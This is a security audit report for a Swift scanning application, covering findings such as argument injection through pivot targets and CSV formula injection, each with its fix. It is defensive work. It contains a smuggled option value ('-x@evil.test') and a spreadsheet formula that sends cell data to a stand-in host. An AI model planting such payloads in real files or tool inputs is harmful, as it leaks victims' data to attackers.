# Code-level security audit — 2026-08-30

Scope: the whole repository — 22,778 lines across 186 Swift files, the report
subprocess, and the browser frontend. Earlier audits in this directory assessed
production posture and rollout; this one reads the code. Every finding below was
traced to a concrete path, not inferred from a pattern match.

The first pass covered Swift and Python only and was published as complete. It
was not: the frontend renders findings — text lifted from third-party pages —
into the DOM and into a client-generated file, which is where this class of bug
actually lives. F7 and F8 come from closing that gap.

## Findings

### F1 — Medium: the pivot path bypassed the input validator

`PivotExtractor.candidates` produced scan targets that never passed
`InputValidator.validateScanInput`. Those targets are attacker-controlled in
exactly the way `/scan` input is — they come from a third party's page, API
response or commit metadata — but only the front door was gated.

The validator rejects a leading hyphen with an explicit reason: *"so a target can
never be interpreted as a flag by a downstream argv-based tool (whois/holehe)."*
The pivot path reopened precisely that control.

Reachable chain, all steps verified in source:

1. Anyone may set an arbitrary git author address and push it to a public
   repository.
2. `UsernamePlugin` harvests commit author addresses from a target's public
   events and emits them at confidence 0.9 — above `minPivotConfidence` (0.8).
3. `PivotExtractor.isScannable` accepts `-x@evil.test`: its character class
   `[a-z0-9._%+-]` allows a leading hyphen.
4. Shape gating routes the candidate to `BulkEmailPlugin`.
5. `EmailAddress.normalize` permits it — the RFC local-part grammar allows a
   leading hyphen.
6. `BoundedProcess.run(arguments: [cleanedEmail, "--only-used", "--no-color"])`
   hands it to holehe as its first argument, where it parses as an option.

Impact is bounded — arguments are passed as argv with no shell, so an unknown
option makes holehe exit non-zero and the plugin returns nothing — but the blast
radius depends on a third-party tool's option set, which is not ours to rely on.
`isScannable` also admitted `%`, which the front door forbids and which reaches
plugin URL-path construction.

**Fixed.** Pivot candidates now pass through `InputValidator.validateScanInput`
and must survive it unchanged. This subsumes the SSRF check added earlier the
same day, so one gate now governs every entry point. Regression tests cover the
hyphen and percent cases and were verified against a positive control: both fail
with the validator call removed.

### F2 — Low: GraphML export could be made unparseable by upstream content

`IdentityGraph.esc` escaped the five XML entities in the correct order but did
not remove control characters, which XML 1.0 forbids outright — escaping cannot
rescue them, so a conforming parser rejects the whole document.

Finding text is lifted from third-party pages (a page title via `SiteMeta`, a
WHOIS record via `DomainPlugin`), and `PluginResultLimits.sanitize` truncates but
does not strip control bytes. A victim who scanned attacker-controlled
infrastructure could therefore receive a GraphML export nothing would open. Not
cross-site scripting: the response is `Content-Disposition: attachment`.

**Fixed.** `esc` drops control characters other than tab, LF and CR before
escaping.

### F3 — Informational: two different policies for anonymous scans

`Scan.authorizeRead` treats an ownerless scan as capability-access — anyone
holding the 122-bit scan ID may read it, which is deliberate and documented.
`ReportController` treats the same scan as admin-only. The stricter rule is on
the more sensitive artifact, so this is not a weakness, but the two policies
should be reconciled deliberately rather than left divergent.

### F4 — Informational: silent unkeyed blind-index fallback

`FieldCrypto.blindIndex` falls back to unkeyed `sha256Hex` when
`TokenEncryption` is unconfigured. An unkeyed hash of an email address is
reversible by dictionary attack, defeating the point of a blind index.
Production cannot reach this: `configure.swift` calls
`TokenEncryption.validateConfiguration(required: app.environment == .production)`
and refuses to boot without a valid key. The residual risk is a non-production
environment pointed at real data, which would write reversible indexes without
logging anything.

### F5 — Informational: polynomial backtracking on attacker-influenced text

`Correlator`'s unanchored extraction regexes contain ambiguous splits — notably
`[a-zA-Z0-9.\-]+\.`, where the class contains the literal that follows it.
Backtracking is polynomial rather than exponential, and input is capped at
`maxRawDataBytes` (8 KB), so this is bounded. Recorded so a future change to
either the pattern or the cap is made with it in mind.

### F6 — Informational: admin authorization was per-handler — fixed

Every admin handler checked `isAdmin` immediately after resolving the user, and
all of them did it correctly, so there was no vulnerability. The weakness was
that it was only a convention. The admin surface spans **two** controllers —
`AdminController` and `UserController`'s `/admin/scans` — so "every admin
handler remembers the guard" was a property nobody enforced, and a seventh route
added elsewhere would have depended on its author noticing the pattern.

`APIKeyRoutePolicy` already denies API keys on admin routes and fails closed on
unclassified ones, but that governs API-key authentication only; session-
authenticated access had no structural gate.

**Fixed.** `AdminMiddleware` now guards both registrations. The per-handler
checks are deliberately kept alongside it rather than replaced: the middleware
covers a handler that forgets its own check, and the handler check covers a route
registered outside the group. Neither is redundant, because each fails in the
case the other cannot see.

The guarantee is verified structurally: a test enumerates Vapor's **live route
registry** for every path beginning with `admin` and asserts each refuses an
unauthenticated caller, so a new admin route is covered the day it is registered
rather than the day someone remembers to add it to a list. Checked against a
positive control — an unguarded `/admin/leaky-probe` makes the test fail with
that exact route named.

### F7 — Medium: formula injection in the client-side CSV export

The backend has no CSV writer, which the first pass correctly established — and
then wrongly concluded the class did not apply. The **frontend** builds the CSV
itself (`index.html`, the `export-csv-btn` handler), writing `r.rawData` into
cells quoted only for embedded double-quotes.

RFC 4180 quoting makes the file parse correctly; it does nothing about formula
injection. Excel, LibreOffice and Google Sheets evaluate a cell whose value
begins with `=`, `+`, `-` or `@` — the surrounding quotes are stripped before
that decision is made.

`rawData` is third-party text by construction: `SiteMetaPlugin` stores a scanned
page's `<title>`, `DomainPlugin` stores WHOIS output, `PastebinPlugin` stores
paste excerpts. An attacker who controls a page the victim scans controls a cell
in the victim's spreadsheet. `=HYPERLINK("https://evil.test?x="&A1,"click")`
exfiltrates neighbouring data on click, and `=IMPORTXML(...)` fires without any
interaction in Sheets.

**Fixed.** Cells beginning with a formula-leading character — including the tab
and carriage-return variants used to bypass naive checks — are prefixed with an
apostrophe, which marks them literal text in all three applications. Verified
against six published vectors, with an ordinary finding confirmed to pass
through unchanged. The download filename now follows the same allowlist
discipline the server applies to `Content-Disposition`.

### F8 — Low: unescaped interpolation into an HTML sink on the map

`index.html` passed GeoIP fields into Leaflet's `bindPopup`, which takes an HTML
string, without escaping. Not reachable today: the values come from the offline
MaxMind database rather than from a scanned page, and the frontend renders only
lookups with `status === "success"`, which requires `query` to have parsed as an
address. It was, however, the one place in that file where third-party text met
an HTML sink unescaped — `createResultCard` sets the opposite standard three
thousand lines earlier, in a template of empty placeholders filled by
`textContent`, with a comment saying so.

**Fixed.** The five interpolations are escaped, which also removes any need to
reason about the hygiene of a vendor data file.

## Verified clean

Stating only defects would misrepresent the codebase. The following were examined
and found sound:

- **SQL injection.** Every `.raw` interpolation uses `bind:` or `ident:`. The one
  dynamic identifier is a compile-time model constant (`Scan.schema` and peers).
- **Command injection.** No shell is invoked anywhere. `BoundedProcess` requires
  an absolute executable path, passes argv, supplies an explicit environment
  rather than inheriting one, allocates a private `HOME`/`TMPDIR`, and bounds
  stdout, stdin and wall-clock time. Report data reaches Python over stdin as
  JSON, never as an argument.
- **Sessions and passwords.** `__Host-` cookie prefix, `Secure`, `HttpOnly`,
  `SameSite=strict`, absolute TTL. Bcrypt cost 12, with a dummy hash computed on
  unknown users to flatten the timing signal.
- **Secrets and tokens.** Share tokens are 192 bits from `SystemRandomNumber-`
  `Generator`, stored only as hashes; API keys likewise; 2FA recovery codes carry
  ~2^59.5 entropy and are consumed under a row lock, so a code cannot be spent
  twice concurrently. Comparisons that matter are constant-time; the rest compare
  hashes, not secrets.
- **Output encoding.** The HTML report escapes every interpolation that is not a
  static stylesheet, an integer, or an already-escaped fragment, ampersand first.
  The PDF path uses `fpdf.cell`, which places literal text with no markup
  interpretation, after stripping newlines and capping length.
- **Header injection.** `safeName` reduces filenames to an allowlist of letters,
  digits, `_` and `-`, so no CR/LF or quote can reach `Content-Disposition`.
- **SSRF.** `OutboundHTTP.pinnedDestination` gates every plugin request through
  `SSRFGuard.isInternalURL` and pins the validated address, mitigating rebinding.
- **Server-side export formats.** JSON, Markdown, HTML, PDF and GraphML; no CSV
  writer exists on the server. The client-side CSV export is F7.
- **Privilege escalation.** No `Content`-decoded struct carries `isAdmin` or any
  role field, so no update endpoint can be coaxed into granting it.
- **Logging.** No secret, token, scan target or email address is interpolated
  into a log line; audit records store an IP prefix that is anonymised and then
  encrypted.
- **Boot gates.** Production refuses to start without a valid encryption key or
  audit signing key, and bounds notification, export and dark-web configuration
  at startup rather than trusting them at use.
- **Frontend DOM sinks.** 71 `innerHTML` uses across three non-vendored files,
  against 177 uses of `textContent`. The result renderer is a static template of
  empty placeholders filled by `textContent`, deliberately and with a comment.
  `investigation.js` and `admin.js` escape in both attribute and text contexts,
  the former noting that entity types can arrive from imported GraphML. No
  `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval` or `srcdoc`
  anywhere. The single unescaped sink was F8.
